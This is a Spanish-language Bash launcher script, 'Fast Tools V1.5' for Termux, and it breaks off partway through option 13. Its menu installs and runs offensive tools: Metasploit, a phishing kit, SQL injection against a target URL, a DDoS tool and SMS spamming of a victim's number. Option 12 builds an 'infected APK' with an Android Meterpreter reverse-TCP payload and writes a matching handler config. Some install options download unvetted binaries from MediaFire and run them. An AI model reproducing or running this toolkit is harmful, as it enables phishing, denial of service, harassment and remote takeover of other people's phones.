#!/bin/bash
#
#
#
#
#
#colors    
cd $HOME
#reiniciar
function reiniciar {
	echo $(clear)
	bash $PREFIX/bin/FT
	
}
#Colors                                                                 
R='\033[1;31m'                                                          G='\033[1;32m'                                                          Y='\033[1;33m'                                                          B='\033[1;34m'                                                  
M='\033[1;35m'                                                          C='\033[1;36m'   
W='\033[0m'
echo $(clear)
printf "$G"
echo "      =============================="                             
echo "               __    __  __   "
echo "               | |   \ \/ / "
echo "               | |    \  /"
echo "               | |___ /  \ "                                      
echo "               |_____/_/\_\ "                                     
echo                                                                    
echo "     Thanks for your teaching to Ivam3"                           
echo "      ====== By ___ Cinderella ======"                            
echo                                                                    
echo
printf "$C\n"                                                          
echo "          [---] Join me on [---]"                                 
echo "[-] www.youtube.com/c/ivam3bycinderella [-]"                      
echo "      [-] t.me/Ivam3byCinderella [-]"                             
echo "            [-] t.me/ivam3 [-]"                                   
printf "$R\n"                                                           
echo "          [---] README.md [---]"                                  
printf "$W"
echo " This file will need  install.sh UPGRADE to v.1.5"                          
echo
printf "$R\n"
echo "          [---] DISCLAIMER [---]"
printf "$W"
echo "   If the law is violated with it's use"
echo "     This would be the responsibility"
echo "        of the user who handled it"
printf "$R"
echo "       [-] Use At Your Own Risk [-]"
printf "$W\n"
printf "$C        Press$G ENTER$C to continue"
printf "$W\n"
read enter
#colors
C='\033[1;36m'
G='\033[1;32m'
R='\033[1;31m'                                                          Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
RE='\033[0m'
echo $(clear)
sleep 
function banner {
	echo $(clear)
	printf "
        
      -::-#####@WWW:   @WWWW=
                  #WW@--WWWWW@
                  *##WW*-=W@*
                 -#WWWWWWWW-
       $Y FAST   -@WWWWWWWWWW@ $R TOOLS
              @WWWWWWW@+.*WW#+
            :@WWWWWW*$C V1.5*WWWWWWW:
           *WWWWWWWWW=
         -#WWWW=-.:WWWW@-
       :@@@@#:    .*@@WW=
     *WWWW+  :=@WWWWWWWWW-
     :@=-   *WWWWW@=+:
"
}
function disclaimer {
setterm --background red

printf "$Y
  :: Disclaimer: Developers assume no liability and are not     ::
  :: responsible for any misuse or damage caused by Fast Tools  ::"
setterm --background black
}
setterm -foreground green
banner
disclaimer
echo
printf  "$C
1) $G MSFCONSOLE (Actualizado)$C
2) $G EMBED (Actualizado)$C
3) $G actualizar repositorio termux $C
4) $G Servidor PHP WEB? $C
5) $G ShellPhish $C
6) $G Conexion Reconectable a SSH Serveo$C
7) $G IPGEOLOCATION $C
8) $G APK EMBED+MSF $C   
9) $G SQLMAP INYECCION WEB $C
10)$G ATTACK DDoS $C
11)$G Spam SMS $C
12)$G Payload Android con MSF $C
13)$G APK HANDLER+MSF $C
14)$G Crear Virus$C
15)$G Force Brute GMAIL$R
0) $Y Info Of Script$R
00) $R exit $Y
"
echo
read -p "[!]Choose an Option >> " opc
case $opc in
	1)

		cd $HOME
		echo $(clear)
		setterm -foreground green
		banner
		printf "$G"
		echo " SE INICIARA MSF CONSOLE"
		echo
		sleep 5
		if [ -e $PREFIX/bin/msfconsole ]; then
			printf "\n$Y [!]$Y MSFCONSOLE . . .$G DONE!!!\n$W"
			echo
			echo
		else
			printf "\n$R Oops!! $R FT required msf , do u wanna install it $W
"
echo
sleep 5
printf "$Y"
echo
printf "$G DESEAS INSTALL MSFCONSOLE ?$G


$G 1) $G INSTALL MSFCONSOLE OF IVAM3 (recomendado)

$G 2) $Y INSTALL MSFCONSOLE OFICIAL

$G 3) $R NO INSTALL AND EXIT"$G
echo
echo
read -p " Choose an Option >> " h
case $h in
	1)
		echo $(clear)
		echo                                                  
		printf "$Y"

		echo                                                    
		sleep 5                                                 
		echo " ::::::::: INSTALANDO MSF OF IVAM3 ::::::::::::"  
		echo                                                    
		cd $HOME                                                
		sleep 5           
		wget -L http://download1773.mediafire.com/kjswpknuxq1g/nd87tgsjyy3obc0/IbyC-metasploit
		chmod 777 IbyC-metasploit                           
		sleep 5                                                 
		./IbyC-metasploit                         
		reiniciar
				;;
			2)
				echo $(clear)                           
				printf "$G"
				echo " INICIANDO DESCARGA MSFCONSOLE Y ULTIMA VSERSION"
				sleep 10
				echo
				cd $HOME
				echo $(clear)
				satterm -foreground blue
				banner
				sleep 5                                 
				echo                                    
				printf "$G"
				echo "MSF SE ACTUALIZARA A LA LA ULTIMA VERSION, SIEMPRE Y CUANDO NO TENGAS MSFCONSOLE INSTALADO"
				sleep 10
				pkg install wget
				wget https://Auxilus.github.io/metasploit.sh
				bash metasploit.sh
				reiniciar
				;;
			3)
				exit
				;;
                esac
	fi
	sleep 5
	printf "$G"
	echo " INICIANDO MSFCONSOLE"
	echo $(clear)                                         
	setterm -foreground red
	banner
	echo
	echo

	printf "$G"
	echo " INICIANDO..."
	echo
	cd $HOME

	cd metasploit-framework	
	sleep 1
	./msfconsole
	reiniciar
		;;
	2)
		cd $HOME
                echo $(clear)
		setterm -foreground green
		banner
                printf "$G"
                echo " INICIANDO EMBED" 
		echo
		sleep 5
		if [ -e $PREFIX/bin/EMBED ]; then
			printf "\n$Y [!]$Y EMBED . . .$G DONE!!!\n$W" 

		else
			printf "\n$R Oops!! $R FT required EMBED , do u wanna install it $W"
			echo                                           
			sleep 5                                         
			printf "$Y"                                                      
			echo                                     
			printf "$G DESEAS INSTALL EMBED ?$G 
			
$G 1) $C INSTALL EMBEB			

$G 2) $R NO INSTALL AND EXIT$G" 
			echo                                           
			echo
			read -p " Choose an Option >> " IO          
			
			case $IO in                                    
				1)                             
					echo $(clear)                   
					echo                        
					printf "$Y"              

					echo
					sleep 5                       
					echo " ::::::::: INSTALANDO EMBED OF IVAM3 ::::::::::::" 
					echo                          
					cd $HOME                      
					sleep 5 
					wget -L http://download1442.mediafire.com/k5clbo5zwnzg/s39jxovcn17pavx/fix-arg-x
					chmod 777 fix-arg-x
					sleep 5                   
					./fix-arg-x
					reiniciar			
					;;
				2)
					exit
					;;
			esac
		fi
		sleep 5                                                 
		echo $(clear)                                    
		setterm -foreground red
		banner
		echo             
		echo                          
		printf "$G" 
		echo " INICIANDO..."
		sleep 5
		EMBED
		reiniciar
                  ;;
	3)
		cd $HOME
		echo $(clear)
		setterm -foreground green
		banner
sleep 5
printf "$G"
echo " OK AHORA VAMOS A ACTUALIZAR TU REPOSITORIO "
sleep 10
echo
printf "$G :::::::::: ACTUALIZANDO :::::::::: 
$G"
sleep 5
apt install -y autoconf && apt install bison && apt install clang coreutils && apt install axel && apt install curl && apt install findutils && apt install git && apt install apr && apt install apr-util && apt install libffi-dev && apt install libgmp-dev && apt install libpcap-dev && apt install postgresql-dev && apt install readline-dev && apt install libsqlite-dev && apt install openssl-dev && apt install libtool && apt install libxml2-dev && apt install libxslt-dev && apt install ncurses-dev && apt install pkg-config && apt install wget && apt install make && apt install ruby-dev && apt install libgrpc-dev && apt install termux-tools && apt install  ncurses-utils && apt install ncurses && apt install unzip && apt install zip && apt install tar && apt install postgresql && apt install termux-elf-cleaner && gem install lolcat
echo
sleep 1
sleep 5
printf "$G"
echo " CONTINUAR CON EL REPOSITORII COMPLETO"
echo
printf "$G PRESIONA ENTER"
read enter
apt install coreutils && apt install vim && apt install python python2 && apt install ruby && apt install ruby-dev && apt install perl && apt install clang curl && apt install wget && apt install make && apt install openssl && apt install php && apt install zip && apt install unzip && apt install tar && apt install htop && apt install  bison && apt install findutils && apt install git && apt install apr && apt install apr-util && apt install libffi-dev && apt install libgmp-dev && apt install postgresql-dev && apt install readline-dev && apt install libsqlite-dev && apt install openssl-dev && apt install libtool && apt install libxml2-dev && apt install libxslt-dev && apt install ncurses-dev && apt install pkg-config && apt install libgrpc-dev && apt install termux-tools && apt install ncurses-utils && apt install ncurses && apt install postgresql && apt install termux-elf-cleaner && apt install openssl-tool && apt install python -y && pip2 install && pip install --upgrade pip &&  apt install git -y && apt update &&  apt upgrade
echo $(clear) 
sleep 5
setterm -foreground green
banner
echo
sleep 5
printf "$R"
echo " LISTO TU REPOSITORIO FUE ACTUALIZADO CON TODAS LAS HERRAMIENTA DEL SYSTEMA NECESARIAS DE TERMUX "
sleep 15
echo
echo
printf "PRESIONA ENTER PARA TERMINAR"
echo $(clear)
reiniciar
;;

4)

	cd $HOME
	echo $(clear)
	setterm -foreground green                                   
	banner
	echo
	printf "$G"
	echo " INICIANDO SERVIDOR PHP"
	echo
	sleep 5
	if [ -e $PREFIX/bin/php ]; then
                printf "\n$Y [!]$Y PHP . . .$G DONE!!!\n$W"
		sleep 5
        else
                printf "\n$R Oops!! $R FT required PHP , do u wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"

                        echo
                        printf "$G DESEAS INSTALL PHP ?$G

$G 1) $C INSTALL PHP
                                                                        $G 2) $R NO INSTALL AND EXIT$G"
                        echo
                        echo
                        read -p " Choose an Option >> " L
			case $L in
				1)
					echo
					printf "$Y"
					echo " CREANDO DIRECTORIO PHP"
					sleep 5
					mkdir php
					pkg install php && pkg install autossh
					;;
				2)
					exit
			esac

        fi
	sleep 5
	echo $(clear)  
	setterm -foreground green
	banner
	echo
	printf "$G"
	echo " INICIAR SESSION PHP WEB "
	echo 
	sleep 2
	read -p " INTRODUCE LA RUTA PHP WEB >> " RUT
	sleep 1
	echo
	printf "$G"
	read -p " INTRODUCE DOMINIO AL URL ej'mundo' >> " m
	echo
	read -p " INTRODUCE UN PUERTO (recomendado '8080')" phport
	sleep 2
	echo $(clear)
	setterm -foreground yellow
	banner
	echo
	echo
	echo
	sleep 2
	printf "[$Y!]$C INICIANDO SERVIDOR PHP WEB  AL $G[$Y!W$R!]$Y https://$m.serveo.net"
	sleep 5
	echo
	echo
	printf "[$Y!] $G SERVER WEB STARTED [$C!]"
	sleep 2
	echo
	printf "$G"
	echo
	autossh -M 0 -R $m:80:localhost:$phport serveo.net & php -S localhost:$phport -t $RUT
	echo
	printf "$Y PRESIONE ENTER PARA IR AL MENU PRINCIPAL..."
	read enter
	reiniciar
	 	 ;;
5)
	cd $HOME
	echo $(clear)
	setterm -foreground green
	banner
	printf "$G"
	echo " SE INICIARA SHELLPHISH PISHING"
	sleep 5
	echo
	if [ -e ~/FastTools/.phish ]; then
                printf "\n$Y [!]$Y SHELLPHISH . . .$G DONE!!!\n$W"
		sleep 5
        else
	
		printf "\n$R Oops!! $R FT required SHELLPHISH , do u
wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"
			echo
			printf "$G DESEAS INSTALL SHELLPHISH ?$G

$G 1) $C INSTALL SHELLPHISH

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
			echo
			read -p " Choose an Option >> " U
			case $U in
				1)
					printf "$G"
					echo
					echo " SE INICIARA A LA DESCARGA DE SHELLPHISH OFICIALMENTE"
					sleep 5
					rm -rf shellphish
					git clone https://github.com/thelinuxchoice/shellphish.git && cd shellphish && chmod 777 shellphish.sh && cd $HOME && mv shellphish FastTools/.phish
					;;
				2)
					exit
			esac
		fi
	sleep 5
	echo $(clear)
	printf "$G"
	echo " INICIANDO SHELLPHISH PISHING... "
	sleep 5
	echo $(clear)                                                  
	setterm -foreground green
	banner
	echo                                                            
	echo                                                            
	echo
	sleep 10
	cd $HOME
	cd FastTools/.phish
	sleep 2
	bash shellphish.sh
	reiniciar
	;;
6)
	cd $HOME
	echo $(clear)
	setterm -foreground blue
	banner
	echo
	printf "$G INICIANDO SERVEO"
	echo
	sleep 5
	if [ -e $PREFIX/bin/autossh ]; then
		printf "\n$Y [!]$Y AUTOSSH . . .$G DONE!!!\n$W"
		sleep 5
	else
		printf "\n$R Oops!! $R FT required AUTOSSH, do u wanna install it $W"                                                         
		echo
		sleep 5
		printf "$Y"                                     
		echo                                                
		printf "$G DESEAS INSTALL AUTOSSH ?$G             
	
$G 1) $C INSTALL AUTOSSH                                               

$G 2) $R NO INSTALL AND EXIT$G"  
                        echo
			echo
			read -p " Choose an Option >> " V
			case $V in
				1)
					echo
					printf "$G :::::::::::INSTALANDO::::::::::::::"
					echo
					sleep 5
					pkg install autossh
					;;
				2)
					exit
			esac
		fi
	setterm -foreground green
	banner
	printf "$G"
	echo " INICIAR CONEXION A SERVEO"
		sleep 10
		echo
		echo
		printf "$Y"
		echo " NOTE: SI USARAS SERVEO PARA ACTIVAR UN SUBDOMINIO DE PHP USA ESTE EJEMPLO ' facebook.com:80 ' AUN QUE EL PUERTO 80 ES NECESARIO EN ESTE CASO PARA ACTIVAR EL SUBDOMINIO, Y INSERTA EL localhost Y PUERTO FINAL QUE USASTE EN SERVIDOR PHP PARA EL DOMINIO/URL QUE APARECERA ARRIBA DEL TU WEB. EJEMP ' facebook.com:80 EN PRIMERA OPCION, SEGUNDA IP O localhost QUE PUSIMOS EN PHP, SI PUSIMOS localhost PONEMLS EN SEGUNDA OPCION localhost Y EN TERCERA OPCION PONEMOS EL PUERTO QUE USAMOS EN LA PHP COMO FINAL, EJEMP DEBE QUEDAR ASI ' facebook.com:80:localhost:6718 ' ETC, Y SI SOLL ES SERVEO SIN SUBDOMINIO PUES USALO CON PUERTO Y TODO LO QUE PIDA, PERO EN CUESTION DE SUBDOMINIO DE PHP ESTE ES EL EJEMP"
		echo
		echo
		printf "$G PRESS ENTER TO CONTINUE"
		read enter
		sleep 5
		echo
		echo
		printf " \n $M  Introduce Tu Puerto $W \n "
        while read -p ">> " puerto1 && [ -z $puerto1 ];do
        sleep 2
                sport1
                done
		printf " \n $M Introduce Tu IP o LocalHost $W \n "
        while read -p ">> " puerto2 && [ -z $puerto2 ];do
                printf " $R Escribe el puerto $W \n"
                sleep 2                                                                                           sport2
        done
	echo
	printf "$G"
	read -p " Introduce Tu Puerto Final >> " port3
	clear
	echo $(clear)                                                   
	setterm -foreground red
	banner
	echo
	echo
	printf "$M [$Y!$M] $G Iniciando SSH a serveo Reconectable...$W \n"
	echo
	printf "$G CONECTACTANDO  A  $puerto1:$puerto2:$port3 SSH SERVEO"
	echo
	sleep 5
	echo
	autossh -M 0  -R $puerto1:$puerto2:$port3 serveo.net
	reiniciar
	;;
7)
	#
	echo $(clear)
	cd $HOME
	setterm -foreground green
	banner
	printf "$G"
	echo " INICIANDO IPGEOLOCATION..."
	sleep 5
	echo
	if [ -e ~/FastTools/.geo ]; then
                printf "\n$Y [!]$Y IPGEOLOCATION . . .$G DONE!!!\n$W"
		sleep 5
	else
                printf "\n$R Oops!! $R FT required IPGEOLOCATION , do u
wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"

                        echo
                        printf "$G DESEAS INSTALL IPGEOLOCATION ?$G

$G 1) $C INSTALL IPGEOLOCATION

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
                        echo
                        read -p " Choose an Option >> " A
			case $A in
				1)
					echo
					printf "$G INSTALLING IPGEOLOCATION"
					echo
					sleep 5
					rm -rf IPGeoLocation
					echo
					git clone https://github.com/maldevel/IPGeoLocation && cd IPGeoLocation && chmod 777 requirements.txt && chmod 777 ipgeolocation.py && cd $HOME && mv IPGeoLocation FastTools/.geo
					echo
					sleep 3
					cd $HOME
					cd FastTools/.geo
					pip install -r requirements.txt
					;;
				2)
					exit
			esac

        fi
	sleep 5
	echo
	echo
	echo
	echo
	echo $(clear)
	printf "$G"
	echo " INICIANDO IPGEOLOCATION"
	sleep 5
	echo $(clear)
	printf "$R"                                                             sleep 5                                       
	echo $(clear)                                                          
	setterm -foreground yellow
	banner
	echo                                                            
	echo               
	cd $HOME
	sleep 2
	cd FastTools/.geo
	printf "$M [$Y!$M] $G Iniciando LOCACTION INFO...$W \n"        
	echo
	echo
	echo
	printf "$G"
	read -p " INTRODUCE LA IP DE LA VICTIMA >> " IP
	python ipgeolocation.py -t $IP
	echo
	printf "$G POR FAVOR PRESIONA ENTER PARA MENU PRINCIPAL"
	read enter
	reiniciar
	;;
	
8)

	cd $HOME                                                
	echo $(clear)
	setterm -foreground green
	banner
	printf "$G"                                                     
	echo " INICIANDO APPS RC EMBED+MSF CONFIG"   
	echo
	sleep 5
	if [ -e $PREFIX/bin/EMBED ]; then
                printf "\n$Y [!]$Y EMBED . . .$G DONE!!!\n$W"
		sleep 5

	else
		printf "\n$R Oops!! $R FT required EMBED , do u wanna install it $W"      
		echo
		sleep 5
		printf "$Y"
		echo                                                   
		printf "$G DESEAS INSTALL EMBED ?$G          

$G 1) $C INSTALL EMBEB

$G 2) $R NO INSTALL AND EXIT$G"
		echo                                                   
		echo                                                   
		read -p " Choose an Option >> " IO
		case $IO in
			1)
				echo $(clear)
				echo
				printf "$Y"
				echo
				sleep 5
				echo " ::::::::: INSTALANDO EMBED OF IVAM3 ::::::::::::"
				echo			
				cd $HOME                           
				sleep 5                               
				wget https://raw.githubusercontent.com/ivam3/embed/master/fix-arg-x          
				chmod 777 fix-arg-x                     
				sleep 5                               
				bash ./fix-arg-x                    
				reiniciar
				;;
			2)
				exit
				;;                                     
		esac
	fi
	sleep 5
	echo $(clear)                                                   
	setterm -foreground red
	banner
	echo                                                            
	echo                                                            
	printf "$M [$Y!$M] $G Iniciar APK RC CONFIG EMBED+MSF...$W \n"  
	echo                                                            
	echo
	cd java/handler
	printf "$Y"                                                     
	echo " EJEMPLO LAS APK  PARA SESSION EMBED SE GUARDAN EN .apk.rc"       
	echo
	printf "$Y"
	echo " COPIA Y PEGA o ESCRIBE EL NOMBRE COMPLETO DEL APK"
	echo
	sleep 5
	ls
	printf "$G"                                                     
	echo                                                            
	read -p " INTRODUCE EL NOMBRE DEL APK.RC >> " APK
	echo $(clear)                                                 
	setterm -foreground purple
	banner
        echo                                                            
	echo                                                            
	echo                                                            
	printf "$M [$Y!$M] $G Iniciando APK RC EMBED+MSF $APK...$W \n" 
	echo
	msfconsole -r $APK
	reiniciar
	;;
9)

	cd $HOME                                                        
	echo $(clear) 
	setterm -foreground green
	banner
	echo
	printf "$G"                                                     
	echo " INICIANDO SQLMAP INYECCIONES WEB"
	echo
	sleep 5
	if [ -e ~/FastTools/.SQ ]; then
                printf "\n$Y [!]$Y SQLMAP . . .$G DONE!!!\n$W"
		sleep 5

        else
                printf "\n$R Oops!! $R FT required SQLMAP , do u wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"

                        echo
                        printf "$G DESEAS INSTALL SQLMAP ?$G

$G 1) $C INSTALL SQLMAP

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
                        echo
                        read -p " Choose an Option >> " O
			case $O in
				1)
					echo
					printf "$Y"
					echo " INSTALANDO SQLMAP INYECCION WEB"
					sleep 5
					rm -rf sqlmap
					echo
					sleep 2
					git clone https://github.com/sqlmapproject/sqlmap.git && cd sqlmap && chmod 777 sqlmap.py && cd $HOME && mv sqlmap FastTools/.SQ
					;;
				2)
					exit
			esac
        fi
	sleep 5                                                      
	echo $(clear)                                                
	sleep 5                                                         
	echo $(clear)                                                   
	setterm -foreground red
	banner
	echo                                                            
	echo  
	printf "$M [$Y!$M] $G Iniciar SQLMAP INYECCIOM BASE DATOS WEB...$W \n"
	echo
	cd $HOME
	sleep 5
	cd FastTools/.SQ
	echo                                                            
	echo
        printf "$Y"
        echo " EJEMPLO, ESTA SERAN LAS CONFIG QUE DEBEN USAR DE PUES DE USAR --dbs, AL PRINCIPIO SOLO AGREGAMOS EL URL www.facebook.com --dbs Y ES DONDE PRESIONAMOS ENTER LAS CONFIG QUE VERAN A PROXIMA, SE USAN JUNTO AL --dbs PERO DE PUES DE USARLO, UNA VEZ USADO HACEMOS --dbs y LO QUE QUEREMOS VER --tables, --colummns, etc OBSERVA TODAS SUS FUNCIONES"      
	echo                                                            
	echo                                                            
	echo                                                            
	echo                  
	sleep 5
	printf "$G PRESIONA ENTER PARA TODAS OPCIONES SQLMAP"
	read enter
	sleep 2
	python2 sqlmap.py -hh                                                   
	echo                                                            
	echo                                                            
	echo                                                            
	printf "$G"
        read -p " INTRODUZCA EL URL A INYECTAR >> " URLS
	echo
        read -p " INTRODUZCA EL --dbs ETC >> " DBS   	
	echo $(clear)                                                  
        sleep 5
	echo $(clear)                                                   
	setterm -foreground green
	banner
        echo
        echo                                                            
	printf "$M [$Y!$M] $G INYECTANDO A LA WEB $URLS $DBS...$W \n"  
	echo
	echo
	sleep 5
	python2 sqlmap.py -u $URLS $DBS  
	printf "$G POR FAVOR PRESIONA ENTER PARA MENU PRINCIPAL"
	read enter
	reiniciar                                                      
	;;
10)

	cd $HOME                                                        
	echo $(clear)    
	setterm -foreground green
	banner
	printf "$G"
	echo " INICIANDO ATTCK DDOS.."
	sleep 5                                                         
	if [ -e ~/FastTools/.OS ]; then
                printf "\n$Y [!]$Y IbyC-DDoS . . .$G DONE!!!\n$W"
		sleep 5

        else
		printf "\n$R Oops!! $R FT required IbyC-DDoS, do u wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"

                        echo
                        printf "$G DESEAS INSTALL IbyC-DDoS ?$G

$G 1) $C INSTALL EMBEB

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
                        echo
                        read -p " Choose an Option >> " D
			case $D in
				1)
					echo
					printf "$G"
					echo " ::::::::INICIANDO LA INSTALACION DDOS::::::::::::"
					sleep 10                       
					echo                         
					rm -rf DoS-A-Tool
					echo
					sleep 2
					git clone https://github.com/ivam3/DoS-A-Tool.git && cd DoS-A-Tool && chmod 777 DoS-A-Tool && cd $HOME && mv DoS-A-Tool FastTools/.OS
					;;
				2)
					exit
			esac
		fi



        sleep 5
        echo                                                            
	echo $(clear)                                                   
	setterm -foreground green
	banner
        echo
        echo  
	printf "$M [$Y!$M] $G INICIANDO IbyC-DDoS...$W \n"                    echo                                                            
	echo
	cd $HOME
	sleep 2
	cd FastTools/.OS
	sleep 5
        printf "$Y"
        echo " NOTA: INTRODUCIR IP O PAGINA A ATACAR, NO SE OLVIDEN QUE
PARA DETENER EL ATAQUE PRESIONA CTRL+C O VOL- + C Y EL ATAQUE SE A DE DETENER"
sleep 10
echo
                   
	echo                                                            
	echo
        sleep 3
        echo $(clear)
	setterm -foreground red
	banner
	echo                                                            
	echo
	sleep 5
	printf "$M [$Y!$M] $G ESTE DDOS ES MUY POTENTE NO USAR PUERTO 80 NI 8080 \n"          
	echo                                                            
	echo
	sleep 5
	printf "$Y"
	echo " POR FAVOR, POR SU SEGURIDAD USE VPN, PRESIONE ENTER"

	read enter
	sleep 10
	sleep 5
	bash DoS-A-Tool
	echo
        printf "$G VOLVER AL MENU PRINCIPAL PRESS ENTER"
        read enter
        reiniciar                                                               ;;
11)
	cd $HOME
	echo $(clear)
	setterm -foreground green
	banner
	printf "$G"
	echo " INICIANDO SPAM SMS FREE"
	echo
	sleep 10
	if [ -e ~/FastTools/.sms ]; then
                printf "\n$Y [!]$Y SPAM SMS . . .$G DONE!!!\n$W"
		sleep 5
        else
                printf "\n$R Oops!! $R FT required SPAM SMS , do u wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"

                        echo
                        printf "$G DESEAS INSTALL SPAM SMS ?$G

$G 1) $C INSTALL SPAM SMS

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
                        echo
                        read -p " Choose an Option >> " X
			case $X in
				1)
					echo
					printf "$G"
					echo " ::::::::INSTALANDO SPAM SMS::::::::::::"
					echo
					sleep 5
					rm -rf Spammer-Grab
					sleep 2
					echo
					git clone https://github.com/Noxturnix/Spammer-Grab.git && cd Spammer-Grab && chmod 777 spammer.py && cd $HOME && mv Spammer-Grab FastTools/.sms
					;;
				2)
					exit
			esac
        fi
	sleep 5
	echo $(clear)
	setterm -foreground blue
	banner
        echo                                                            
	echo                                                            
	printf "$M [$Y!$M] $G INICIANDO SPAM SMS \n"
	sleep 5
	echo
	echo
	cd $HOME
	sleep 5
	cd FastTools/.sms
	printf "$Y"
	echo " Spams GAC (Grab Activation Code) SMS a un número de teléfono repetidamente cada 60 segundos. "Spammer" usa la API de Grab Grabenger para hacer que se envíen los SMS de GAC. "Spammer" se prueba bajo Python 2.7"
	echo
	echo
	sleep 5
	printf "$G MENSAJE ESCRITO POR SU AUTHOR CONTINUAR"
	read enter
	sleep 5
	echo
	printf "$Y"
	echo " EL NUMERO VICTIMA REQUIERE DEL NUMERO INTERNACIONAL CON + O SIN + PERO NUMERO PRINCIPAL INTERNACIONAL"
	sleep 10
	echo
	echo
	read -p " INTRODUZCA LOS SEGUNDOS AH ENVIAR >> " S
	echo
	read -p " INTRODUZCA EL NUMERO A SPAMEAR >> " N
	echo $(clear)
	setterm -foreground red
	banner
        echo                                                            
	echo                                                           
	sleep 5                                                         
	printf "$M [$Y!$M] $R MENSAJES AH ENVIAR SEG°$S AL N°$N \n"    
	sleep 5
	echo
	sleep 10
	printf "$G"
	echo " ATTCK SPAM SMS ATARTED"
	sleep 5
	echo
	python2 spammer.py --delay $S $N
	echo
	printf "$G VOLVER AL MENU "
	read enter
	reiniciar
	;;
12)

	cd $HOME
	echo $(clear)
	setterm -foreground green
	banner
	printf "$G"                                                                   
	echo " INICIANDO CREATOR METERPRETER ANDROID... "                                          
	sleep 10
	echo $(clear)
	setterm -foreground cyan
	banner
	echo                                                                              
	printf "$M [$Y!$M] $G CREAR APK INFECTADA  \n"                               
	sleep 5                                                                           
	echo                                                                              
	echo
	printf "$Y NOTA: SI USARAS UN ATAQUE FUERA DE LA RED USA ' serveo.net COMO IP O busca su IP CON EL COMANDO ' ping serveo.net ' O USA EL ATAQUE CON ngrok SI ES DENTRO DE LA RED, CONTINUA CON TU IP ETC $G PRES ENTER TO CONTINUE"
	read enter
	echo
	sleep 10
	printf "$G"
	read -p " INTRODUCE EL IP O localhost >> " LHOST
	echo
	read -p " INTRODUCE EL PUERTO A LA APK >> " LPORT
	echo
	cd $HOME
	sleep 5
	cd storage;ls
	sleep 1
	echo
	printf "$G"
	read -p " INTRODUCE LA CARPETA PARA GUARDAR >> " LSDCARD
	echo
	read -p " INTRODUCE EL NOMBRE DEL APK >> " NOMBREAPK
	sleep 5
	cd $HOME
	sleep 2
	if [ -e ~/metasploit-framework ]; then
                printf "\n$Y [!]$Y MSFCONSOLE . . .$G DONE!!!\n$W"
		sleep 5
		cd metasploit-framework
        else
                printf "\n$R [W]$Y MSFCONSOLE . . .$R FAIL!!!\n$W"
		echo
		sleep 5
		printf "$Y NO SE ENCONTRO EL MSFCONSOLE EN TU TERMUX, EN LA OPCION 1) TE BRINDA DE SU INSTALACION, POR FAVOR PRIMERO INSTALE EL MSF CON OPC 1)"
		read enter
		sleep 5
		exit
        fi
	sleep 5

	echo $(clear)
	setterm -foreground green
	banner
	echo                                                                              
	echo
        echo
	echo
	for i in  / - \ - \ - / - \ - / - \ - / - \ - / - \ -; do                    
		printf "$(clear) $Y [$G!$Y] $C CREANDO APK INFECTADA. . . .$i\n"
		sleep 1
	done                     
	sleep 1
	echo
	./msfvenom -p android/meterpreter/reverse_tcp Lhost=$LHOST Lport=$LPORT R > /data/data/com.termux/files/home/storage/$LSDCARD/$NOMBREAPK.apk
	
	sleep 2              
	echo                                                                   
	printf "$G DONE!!!"
	echo                                                   
			sleep 5                                                           
			printf "$Y"                                                       
			echo                                                             
			printf "$G QUE QUIERES HACER ?$G   

$G 1) $C QUIERES HACER UNA CONFIG HANDLER PARA MSFCONSOLE?                                    

$G 2) $R NO AND RESTARD$G"                                                               
                       echo                                                               
		       echo                                                              
		       read -p " Choose an Option >> " s                              
		       case $s in
			       2)
				       reiniciar
				       ;;
		       esac
				       echo $(clear)
				       setterm -foreground white
				       banner
				       echo 
				       printf "$Y CONFIGURA LA CONFIG DEL APK+HANDLER" 
				       echo
				       sleep 5
				       echo
				       echo
				       read -p " INTRODUCE EL IP O localhost >> " FAST2
				       echo
				       read -p " INTRODUCE EL PUERTO A CONFIG >> " FAST
				       echo
				       read -p " INTRODUCE EL NOMBRE DEL APK >> " MAIN
				       echo
				       sleep 10
				       cd $HOME
				      if  [ -e ~/FastTools/.CONFIG ]; then
					printf "\n$Y [!]$Y CORRECT . . .$G DONE!!!\n$W"
				else

					printf "\n$R [W]$G VUELVE . . .$R A INTENTAR!!!\n$W"
					sleep 5
					cd $HOME
					sleep 5
					mkdir FastTools/.CONFIG
				fi
					sleep 7
					echo $(clear)                         
					setterm -foreground red
					banner
					echo               
					echo                                                           
					echo                                                                      
					for o in  / - \ - \ - / - \ - / - \ - / - \ - / - \ -; do                
						printf "$(clear) $Y [$G!$Y] $C CREANDO CONFIG APK+HANDLER. . . .$o\n"             
						sleep 1                                                                   
					done
					sleep 2
					echo -e "use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost $FAST2\nset lport $FAST\nrun" > /data/data/com.termux/files/home/FastTools/.CONFIG/$MAIN.apk.rc
					echo
					sleep 2                                                                   
					echo                                                                      
					printf "$G DONE!!!"                                                       
					echo
					sleep 10                                         
					echo
					printf "$Y CONFIG APK+HANDLER CREADA CON EXITO!!!. . . ."
					echo
					sleep 5
					echo
					printf "$G PRESIONE ENTER CUANDO LA APK INFECTADA Y CONFIG ESTN CREADO"
					read enter
					reiniciar
					;;



		13)
			cd $HOME
			echo $(clear)
			setterm -foreground green
			banner
			printf "$G"
			echo " :::::::::: INICIANDO CONFIG APK+HANDLER :::::::::::::"
			sleep 10
			if [ -e ~/FastTools/.CONFIG ]; then                                         
				printf "\n$Y [!]$Y CORRECT . . .$G DONE!!!\n$W"           
			else                                                             
				printf "\n$R [W]$G VUELVE . . .$R A INTENTAR !!!\n$W"    
				sleep 5                                                   
				cd $HOME                                                  
				sleep 5                                                   
				mkdir FastTools/.CONFIG                                    
			fi
			echo $(clear)                                                     
			setterm -foreground cyan
			banner
			echo                                                              
			echo                                             
			printf "$Y [$G!$Y] $C INICIADOR DE CONFIG HANDLER. . . .\n"       
			sleep 5
			echo
			printf "$Y"
